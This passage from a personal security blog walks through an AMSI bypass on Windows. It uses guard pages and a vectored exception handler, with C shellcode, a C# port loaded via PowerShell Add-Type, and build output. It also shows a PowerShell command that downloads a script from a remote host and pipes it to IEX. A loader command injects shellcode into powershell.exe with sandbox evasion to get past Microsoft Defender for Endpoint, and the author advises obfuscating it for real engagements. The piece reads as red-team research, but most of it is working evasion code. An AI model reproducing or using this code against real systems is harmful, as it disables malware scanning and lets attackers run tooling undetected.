<span id="cb7-15"><a href="https://shigshag.com/#cb7-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-16"><a href="https://shigshag.com/#cb7-16" aria-hidden="true" tabindex="-1"></a>        <span class="co">// Resolve AmsiScanBuffer</span></span>
<span id="cb7-17"><a href="https://shigshag.com/#cb7-17" aria-hidden="true" tabindex="-1"></a>        <span class="dt">uintptr_t</span> amsi_base <span class="op">=</span> resolver<span class="op">::</span>find_module<span class="op">(</span>W_HASH<span class="op">(</span><span class="st">L"amsi.dll"</span><span class="op">));</span></span>
<span id="cb7-18"><a href="https://shigshag.com/#cb7-18" aria-hidden="true" tabindex="-1"></a>        PVOID pAmsiScanBuffer <span class="op">=</span> <span class="op">(</span>PVOID<span class="op">)</span>resolver<span class="op">::</span>find_api<span class="op">(</span>amsi_base<span class="op">,</span> C_HASH<span class="op">(</span><span class="st">"AmsiScanBuffer"</span><span class="op">));</span></span>
<span id="cb7-19"><a href="https://shigshag.com/#cb7-19" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>pAmsiScanBuffer<span class="op">)</span></span>
<span id="cb7-20"><a href="https://shigshag.com/#cb7-20" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
<span id="cb7-21"><a href="https://shigshag.com/#cb7-21" aria-hidden="true" tabindex="-1"></a>            <span class="co">// Make sure to use SIZE_T and not ULONG here. NtProtectVirtualMemory expects an 8 byte value</span></span>
<span id="cb7-22"><a href="https://shigshag.com/#cb7-22" aria-hidden="true" tabindex="-1"></a>            SIZE_T regionSize <span class="op">=</span> <span class="dv">1</span><span class="op">;</span></span>
<span id="cb7-23"><a href="https://shigshag.com/#cb7-23" aria-hidden="true" tabindex="-1"></a>            DWORD oldProtect<span class="op">;</span></span>
<span id="cb7-24"><a href="https://shigshag.com/#cb7-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-25"><a href="https://shigshag.com/#cb7-25" aria-hidden="true" tabindex="-1"></a>            <span class="co">// Reapply PAGE_GUARD on AmsiScanBuffer</span></span>
<span id="cb7-26"><a href="https://shigshag.com/#cb7-26" aria-hidden="true" tabindex="-1"></a>            NtProtectVirtualMemory<span class="op">(</span>NtCurrentProcess<span class="op">(),</span> <span class="op">(</span>PVOID <span class="op">*)&amp;</span>pAmsiScanBuffer<span class="op">,</span> <span class="op">(</span>PULONG<span class="op">)&amp;</span>regionSize<span class="op">,</span> PAGE_EXECUTE_READ <span class="op">|</span> PAGE_GUARD<span class="op">,</span> <span class="op">&amp;</span>oldProtect<span class="op">);</span></span>
<span id="cb7-27"><a href="https://shigshag.com/#cb7-27" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb7-28"><a href="https://shigshag.com/#cb7-28" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-29"><a href="https://shigshag.com/#cb7-29" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> EXCEPTION_CONTINUE_EXECUTION<span class="op">;</span></span>
<span id="cb7-30"><a href="https://shigshag.com/#cb7-30" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb7-31"><a href="https://shigshag.com/#cb7-31" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-32"><a href="https://shigshag.com/#cb7-32" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> EXCEPTION_CONTINUE_SEARCH<span class="op">;</span></span>
<span id="cb7-33"><a href="https://shigshag.com/#cb7-33" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div><p>After the first handler returns <code>EXCEPTION_CONTINUE_SEARCH</code>, the CPU executes the next instruction and triggers a <code>STATUS_SINGLE_STEP</code> exception. We use this to reapply the <code>PAGE_GUARD</code> protection on <code>AmsiScanBuffer</code>, which is necessary because the protection is automatically removed after access as documented by <a href="https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants">Microsoft</a>:</p><blockquote><p>Any attempt to access a guard page causes the system to raise a STATUS_GUARD_PAGE_VIOLATION exception and turn off the guard page status. Guard pages thus act as a one-time access alarm.</p></blockquote><p>The re-protection mirrors the initial setup. During testing I figured that <code>SIZE_T</code> must be used for <code>regionSize</code> instead of <code>ULONG</code> when compiling with <em>x86_64-w64-mingw32-g++</em>. The page was not re-protected if <code>ULONG</code> was beeing used.</p><h3 id="compile-the-shellcode">Compile the shellcode</h3><p>The shellcode is compiled by executing <code>make</code>, which uses <code>x86_64-w64-mingw32-g++ 15.2.0</code> and <code>nasm 2.16.01</code>. The resulting shellcode, located at <code>bin/shellcode.bin</code>, is 944 bytes in size.</p><div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="https://shigshag.com/#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> make</span>
<span id="cb8-2"><a href="https://shigshag.com/#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Compiling C++ <span class="at">-</span><span class="op">&gt;</span> obj/shellcode.o</span>
<span id="cb8-3"><a href="https://shigshag.com/#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Assembling ASM <span class="at">-</span><span class="op">&gt;</span> obj/entry_point.o</span>
<span id="cb8-4"><a href="https://shigshag.com/#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Linking object files <span class="at">-</span><span class="op">&gt;</span> bin/shellcode.exe</span>
<span id="cb8-5"><a href="https://shigshag.com/#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="ex">x86_64-w64-mingw32-ld:</span> bin/shellcode.exe:.text: section below image base</span>
<span id="cb8-6"><a href="https://shigshag.com/#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Extracting raw shellcode <span class="at">-</span><span class="op">&gt;</span> bin/shellcode.bin</span>
<span id="cb8-7"><a href="https://shigshag.com/#cb8-7" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Success! Final shellcode is in bin/shellcode.bin</span>
<span id="cb8-8"><a href="https://shigshag.com/#cb8-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-9"><a href="https://shigshag.com/#cb8-9" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ll bin/shellcode.bin</span>
<span id="cb8-10"><a href="https://shigshag.com/#cb8-10" aria-hidden="true" tabindex="-1"></a><span class="ex">.rw-r--r--</span> 944 bin/shellcode.bin</span></code></pre></div><h2 id="performing-the-bypass">Performing the bypass</h2><p>To illustrate the bypass, <a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a> is executed in memory by reflectively loading its C# assembly using PowerShell’s <strong>System.Reflection.Assembly</strong> class. This will be tested offline on a system with <strong>Microsoft Defender For Endpoint</strong> enabled. The following script will be used to execute the payload:</p><blockquote><p>For this to work the Main function of Seatbelt must be set to public: <code>public static void Main(string[] args)</code></p></blockquote><div class="sourceCode" id="cb9"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb9-1"><a href="https://shigshag.com/#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> Invoke-Seatbelt <span class="op">{</span></span>
<span id="cb9-2"><a href="https://shigshag.com/#cb9-2" aria-hidden="true" tabindex="-1"></a>    <span class="op">[</span>CmdletBinding<span class="op">()]</span></span>
<span id="cb9-3"><a href="https://shigshag.com/#cb9-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">Param</span> <span class="op">(</span></span>
<span id="cb9-4"><a href="https://shigshag.com/#cb9-4" aria-hidden="true" tabindex="-1"></a>        <span class="op">[</span><span class="dt">String</span><span class="op">]</span></span>
<span id="cb9-5"><a href="https://shigshag.com/#cb9-5" aria-hidden="true" tabindex="-1"></a>        <span class="va">$Command</span> <span class="op">=</span> <span class="st">" "</span></span>
<span id="cb9-6"><a href="https://shigshag.com/#cb9-6" aria-hidden="true" tabindex="-1"></a>    <span class="op">)</span></span>
<span id="cb9-7"><a href="https://shigshag.com/#cb9-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-8"><a href="https://shigshag.com/#cb9-8" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Seatbelt.exe as Base64</span></span>
<span id="cb9-9"><a href="https://shigshag.com/#cb9-9" aria-hidden="true" tabindex="-1"></a>    <span class="va">$seatbeltB64</span> <span class="op">=</span> <span class="st">"...SEATBELT_BASE64..."</span></span>
<span id="cb9-10"><a href="https://shigshag.com/#cb9-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-11"><a href="https://shigshag.com/#cb9-11" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Base64 decode directly to byte array</span></span>
<span id="cb9-12"><a href="https://shigshag.com/#cb9-12" aria-hidden="true" tabindex="-1"></a>    <span class="va">$seatbeltBytes</span> <span class="op">=</span> <span class="op">[</span>Convert<span class="op">]::</span>FromBase64String<span class="op">(</span><span class="va">$seatbeltB64</span><span class="op">)</span></span>
<span id="cb9-13"><a href="https://shigshag.com/#cb9-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-14"><a href="https://shigshag.com/#cb9-14" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Load assembly reflectively</span></span>
<span id="cb9-15"><a href="https://shigshag.com/#cb9-15" aria-hidden="true" tabindex="-1"></a>    <span class="va">$seatbelt</span> <span class="op">=</span> <span class="op">[</span>System<span class="op">.</span><span class="fu">Reflection</span><span class="op">.</span><span class="fu">Assembly</span><span class="op">]::</span>Load<span class="op">(</span><span class="va">$seatbeltBytes</span><span class="op">)</span></span>
<span id="cb9-16"><a href="https://shigshag.com/#cb9-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-17"><a href="https://shigshag.com/#cb9-17" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Redirect assembly STDOUT to console</span></span>
<span id="cb9-18"><a href="https://shigshag.com/#cb9-18" aria-hidden="true" tabindex="-1"></a>    <span class="va">$OldConsoleOut</span> <span class="op">=</span> <span class="op">[</span>Console<span class="op">]::</span>Out</span>
<span id="cb9-19"><a href="https://shigshag.com/#cb9-19" aria-hidden="true" tabindex="-1"></a>    <span class="va">$StringWriter</span> <span class="op">=</span> <span class="fu">New-Object</span> IO<span class="op">.</span><span class="fu">StringWriter</span></span>
<span id="cb9-20"><a href="https://shigshag.com/#cb9-20" aria-hidden="true" tabindex="-1"></a>    <span class="op">[</span>Console<span class="op">]::</span>SetOut<span class="op">(</span><span class="va">$StringWriter</span><span class="op">)</span></span>
<span id="cb9-21"><a href="https://shigshag.com/#cb9-21" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-22"><a href="https://shigshag.com/#cb9-22" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Call main method</span></span>
<span id="cb9-23"><a href="https://shigshag.com/#cb9-23" aria-hidden="true" tabindex="-1"></a>    <span class="op">[</span>Seatbelt<span class="op">.</span><span class="fu">Program</span><span class="op">]::</span>Main<span class="op">(</span><span class="va">$Command</span><span class="op">.</span><span class="fu">Split</span><span class="op">(</span><span class="st">" "</span><span class="op">))</span></span>
<span id="cb9-24"><a href="https://shigshag.com/#cb9-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-25"><a href="https://shigshag.com/#cb9-25" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Reset STDOUT</span></span>
<span id="cb9-26"><a href="https://shigshag.com/#cb9-26" aria-hidden="true" tabindex="-1"></a>    <span class="op">[</span>Console<span class="op">]::</span>SetOut<span class="op">(</span><span class="va">$OldConsoleOut</span><span class="op">)</span></span>
<span id="cb9-27"><a href="https://shigshag.com/#cb9-27" aria-hidden="true" tabindex="-1"></a>    <span class="va">$Results</span> <span class="op">=</span> <span class="va">$StringWriter</span><span class="op">.</span><span class="fu">ToString</span><span class="op">()</span></span>
<span id="cb9-28"><a href="https://shigshag.com/#cb9-28" aria-hidden="true" tabindex="-1"></a>    <span class="va">$Results</span></span>
<span id="cb9-29"><a href="https://shigshag.com/#cb9-29" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div><p>The following commands are used to load and execute the script:</p><div class="sourceCode" id="cb10"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb10-1"><a href="https://shigshag.com/#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="op">(</span><span class="fu">New-Object</span> Net<span class="op">.</span><span class="fu">WebClient</span><span class="op">).</span><span class="fu">DownloadString</span><span class="op">(</span><span class="st">'http://192.168.222.1/Invoke-Seatbelt.ps1'</span><span class="op">)|</span><span class="fu">IEX</span><span class="op">;</span></span>
<span id="cb10-2"><a href="https://shigshag.com/#cb10-2" aria-hidden="true" tabindex="-1"></a>Invoke-Seatbelt AntiVirus</span></code></pre></div><p>Executing the above commands <strong>triggers an alert</strong>. This alert can be prevented if AMSI was patched.</p><p><img src="https://shigshag.com/img/1.png"></p><h3 id="injecting-the-shellcode-into-powershell.exe">Injecting the shellcode into PowerShell.exe</h3><p>In order to execute the shellcode we are going to use threadless injection. This will hook the <code>NtWaitForSingleObject</code> function inside PowerShell and once executed it will execute our pre-allocated shellcode within the process. Note that this demonstration uses an offline version of Defender For Endpoint, though this technique has proven reliable against a fully capable MDE setup.</p><div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="https://shigshag.com/#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Compile the shellcode with a private loader</span></span>
<span id="cb11-2"><a href="https://shigshag.com/#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> cynosure <span class="at">--target-process</span> powershell.exe <span class="at">--threadless</span> <span class="at">--threadless-dll</span> ntdll.dll <span class="at">--threadless-function</span> NtWaitForSingleObject <span class="at">--sleep</span> 10 <span class="at">--sandbox-evasion</span> <span class="at">-o</span> darth_vader.exe shellcode.bin</span>
<span id="cb11-3"><a href="https://shigshag.com/#cb11-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-4"><a href="https://shigshag.com/#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Saved</span> binary at: darth_vader.exe</span></code></pre></div><p>We are going to follow the same steps as before. First, however, we will download and execute the shellcode loader.</p><p><img src="https://shigshag.com/img/2.png"></p><h2 id="migrating-to-in-powershell-bypass">Migrating to in PowerShell bypass</h2><p>In PowerShell means that we can perform this patch by compiling <em>C#</em> code from inside the command line and executing it:</p><div class="sourceCode" id="cb12"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb12-1"><a href="https://shigshag.com/#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="va">$PageGuard</span> <span class="op">=</span> <span class="vs">@"</span></span>
<span id="cb12-2"><a href="https://shigshag.com/#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="vs">    // ... C Sharp Code ...</span></span>
<span id="cb12-3"><a href="https://shigshag.com/#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="vs">"@</span></span>
<span id="cb12-4"><a href="https://shigshag.com/#cb12-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-5"><a href="https://shigshag.com/#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="fu">Add-Type</span> <span class="op">-</span>TypeDefinition <span class="va">$PageGuard</span></span>
<span id="cb12-6"><a href="https://shigshag.com/#cb12-6" aria-hidden="true" tabindex="-1"></a><span class="op">[</span>Test<span class="op">.</span><span class="fu">AmsiGuard</span><span class="op">]::</span>Install<span class="op">()</span></span>
<span id="cb12-7"><a href="https://shigshag.com/#cb12-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-8"><a href="https://shigshag.com/#cb12-8" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> Amsi Patch installed</span></code></pre></div><p>For this to work we need to convert the <em>C</em> code to <em>C#</em> with the advantage that we no longer need to dynamically resolve functions since we’re not working with shellcode. The core functionality remains the same, just adapted to <em>C#</em>. However, there are a few important points to note, especially if you’re not experienced in C# (like me).</p><p>The snippet below registers the vectored exception handler and stores it in a variable from the parent class <code>AmsiGuard</code>. If we didn’t save this variable, the garbage collector would eventually remove the exception handler, causing a crash when the system tries to call it.</p><div class="sourceCode" id="cb13"><pre class="sourceCode c#"><code class="sourceCode cs"><span id="cb13-1"><a href="https://shigshag.com/#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="kw">namespace</span> Test</span>
<span id="cb13-2"><a href="https://shigshag.com/#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb13-3"><a href="https://shigshag.com/#cb13-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="kw">static</span> <span class="kw">class</span> AmsiGuard</span>
<span id="cb13-4"><a href="https://shigshag.com/#cb13-4" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb13-5"><a href="https://shigshag.com/#cb13-5" aria-hidden="true" tabindex="-1"></a>        <span class="co">// ...</span></span>
<span id="cb13-6"><a href="https://shigshag.com/#cb13-6" aria-hidden="true" tabindex="-1"></a>        <span class="kw">private</span> <span class="kw">static</span> IntPtr pAmsiScanBuffer <span class="op">=</span> IntPtr<span class="op">.</span><span class="fu">Zero</span><span class="op">;</span></span>
<span id="cb13-7"><a href="https://shigshag.com/#cb13-7" aria-hidden="true" tabindex="-1"></a>        <span class="kw">private</span> <span class="kw">static</span> IntPtr vectoredHandle <span class="op">=</span> IntPtr<span class="op">.</span><span class="fu">Zero</span><span class="op">;</span></span>
<span id="cb13-8"><a href="https://shigshag.com/#cb13-8" aria-hidden="true" tabindex="-1"></a>        <span class="kw">private</span> <span class="kw">static</span> VectoredHandler handlerDelegate <span class="op">=</span> <span class="kw">null</span><span class="op">;</span></span>
<span id="cb13-9"><a href="https://shigshag.com/#cb13-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-10"><a href="https://shigshag.com/#cb13-10" aria-hidden="true" tabindex="-1"></a>        <span class="kw">public</span> <span class="kw">static</span> <span class="dt">void</span> <span class="fu">Install</span><span class="op">()</span></span>
<span id="cb13-11"><a href="https://shigshag.com/#cb13-11" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
<span id="cb13-12"><a href="https://shigshag.com/#cb13-12" aria-hidden="true" tabindex="-1"></a>            <span class="fu">ResolveAmsi</span><span class="op">();</span></span>
<span id="cb13-13"><a href="https://shigshag.com/#cb13-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-14"><a href="https://shigshag.com/#cb13-14" aria-hidden="true" tabindex="-1"></a>            <span class="co">// handlerDelegate and vectoredHandle need to be saved permanently to prevent garbage collection</span></span>
<span id="cb13-15"><a href="https://shigshag.com/#cb13-15" aria-hidden="true" tabindex="-1"></a>            handlerDelegate <span class="op">=</span> <span class="kw">new</span> <span class="fu">VectoredHandler</span><span class="op">(</span>Handler<span class="op">);</span></span>
<span id="cb13-16"><a href="https://shigshag.com/#cb13-16" aria-hidden="true" tabindex="-1"></a>            vectoredHandle <span class="op">=</span> <span class="fu">AddVectoredExceptionHandler</span><span class="op">(</span><span class="dv">1</span><span class="op">,</span> handlerDelegate<span class="op">);</span></span>
<span id="cb13-17"><a href="https://shigshag.com/#cb13-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-18"><a href="https://shigshag.com/#cb13-18" aria-hidden="true" tabindex="-1"></a>            SYSTEM_INFO sys<span class="op">;</span></span>
<span id="cb13-19"><a href="https://shigshag.com/#cb13-19" aria-hidden="true" tabindex="-1"></a>            <span class="fu">GetSystemInfo</span><span class="op">(</span><span class="kw">out</span> sys<span class="op">);</span></span>
<span id="cb13-20"><a href="https://shigshag.com/#cb13-20" aria-hidden="true" tabindex="-1"></a>            <span class="dt">ulong</span> addr <span class="op">=</span> <span class="op">(</span><span class="dt">ulong</span><span class="op">)</span>pAmsiScanBuffer<span class="op">.</span><span class="fu">ToInt64</span><span class="op">();</span></span>
<span id="cb13-21"><a href="https://shigshag.com/#cb13-21" aria-hidden="true" tabindex="-1"></a>            <span class="dt">ulong</span> pageBase <span class="op">=</span> addr <span class="op">&amp;</span> <span class="op">~((</span><span class="dt">ulong</span><span class="op">)</span>pageSize <span class="op">-</span> <span class="dv">1</span><span class="op">);</span></span>
<span id="cb13-22"><a href="https://shigshag.com/#cb13-22" aria-hidden="true" tabindex="-1"></a>            <span class="dt">uint</span> old<span class="op">;</span></span>
<span id="cb13-23"><a href="https://shigshag.com/#cb13-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-24"><a href="https://shigshag.com/#cb13-24" aria-hidden="true" tabindex="-1"></a>            IntPtr basePtr <span class="op">=</span> <span class="kw">new</span> <span class="fu">IntPtr</span><span class="op">((</span><span class="dt">long</span><span class="op">)</span>pageBase<span class="op">);</span></span>
<span id="cb13-25"><a href="https://shigshag.com/#cb13-25" aria-hidden="true" tabindex="-1"></a>            <span class="dt">bool</span> ok <span class="op">=</span> <span class="fu">VirtualProtect</span><span class="op">(</span>basePtr<span class="op">,</span> <span class="op">(</span>UIntPtr<span class="op">)</span>pageSize<span class="op">,</span> PAGE_EXECUTE_READ <span class="op">|</span> PAGE_GUARD<span class="op">,</span> <span class="kw">out</span> old<span class="op">);</span></span>
<span id="cb13-26"><a href="https://shigshag.com/#cb13-26" aria-hidden="true" tabindex="-1"></a>            <span class="kw">if</span> <span class="op">(!</span>ok<span class="op">)</span></span>
<span id="cb13-27"><a href="https://shigshag.com/#cb13-27" aria-hidden="true" tabindex="-1"></a>            <span class="op">{</span></span>
<span id="cb13-28"><a href="https://shigshag.com/#cb13-28" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
<span id="cb13-29"><a href="https://shigshag.com/#cb13-29" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb13-30"><a href="https://shigshag.com/#cb13-30" aria-hidden="true" tabindex="-1"></a>        <span class="co">// ...</span></span>
<span id="cb13-31"><a href="https://shigshag.com/#cb13-31" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb13-32"><a href="https://shigshag.com/#cb13-32" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div><p>The entire snippet can be viewed inside the <a href="https://github.com/ShigShag/AMSI-Bypass-via-Page-Guard-Exceptions/blob/main/patch.cs">GitHub</a> repository. This is just a proof of concept. In real engagements the script should be obfuscated.</p><p>Finally we can paste the snippet into PowerShell and execute it:</p><p><video src="https://shigshag.com/img/1.mp4" controls=""><a href="https://shigshag.com/img/1.mp4">Video</a></video></p><h2 id="final-word-and-references">Final word and references</h2><p>I hope you enjoyed this blog post and learned something new. While this technique has likely been implemented before, I consider it one of the lesser-known methods for patching AMSI. As this is my first blog post, I would appreciate any feedback, positive or negative. Feel free to reach out via LinkedIn, Discord, or other platforms. Finally, here are some references:</p><ul><li><a href="https://www.unknowncheats.me/forum/general-programming-and-reversing/154643-hooking.html">JD96</a> for the tutorial <code>The different ways of hooking</code></li><li><a href="https://5pider.net/">5pider</a> for the <a href="https://github.com/Cracked5pider/Stardust">Stardust Template</a> which helped improving my Shellcode game a lot</li></ul></article>  </main>
<div height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" data-original-tag="iframe"></div></body></html>